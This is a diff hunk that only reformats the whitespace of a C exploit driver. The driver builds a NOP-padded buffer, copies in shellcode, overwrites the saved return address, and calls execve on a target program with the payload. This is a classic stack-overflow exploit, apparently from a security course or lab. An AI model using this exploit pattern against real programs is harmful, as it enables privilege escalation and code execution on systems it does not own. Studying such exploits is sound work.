@@ -11,23 +11,25 @@
 
 int main(void)
 {
-  char *args[3];
-  char *env[1];
+    char *args[3];
+    char *env[1];
 
-  char payload[PAYLOAD_SIZE];
+    char payload[PAYLOAD_SIZE];
 
-  /* Build payload */
-  memset(payload, NOP, PAYLOAD_SIZE);
-  payload[PAYLOAD_SIZE-1]='\0';
-  memcpy(payload, shellcode, strlen(shellcode));
-  *(int *)(payload+PAYLOAD_SIZE-1-4)=RET_ADDR;
+    /* Build payload */
+    memset(payload, NOP, PAYLOAD_SIZE);
+    payload[PAYLOAD_SIZE-1] = '\0';
+    memcpy(payload, shellcode, strlen(shellcode));
+    *(int *)(payload + PAYLOAD_SIZE - 1 - 4) = RET_ADDR;
 
 
-  args[0] = TARGET; args[1] = payload; args[2] = NULL;
-  env[0] = NULL;
+    args[0] = TARGET;
+    args[1] = payload;
+    args[2] = NULL;
+    env[0] = NULL;
 
-  if (0 > execve(TARGET, args, env))
-    fprintf(stderr, "execve failed.\n");
+    if (0 > execve(TARGET, args, env))
+        fprintf(stderr, "execve failed.\n");
 
-  return 0;
+    return 0;
 }
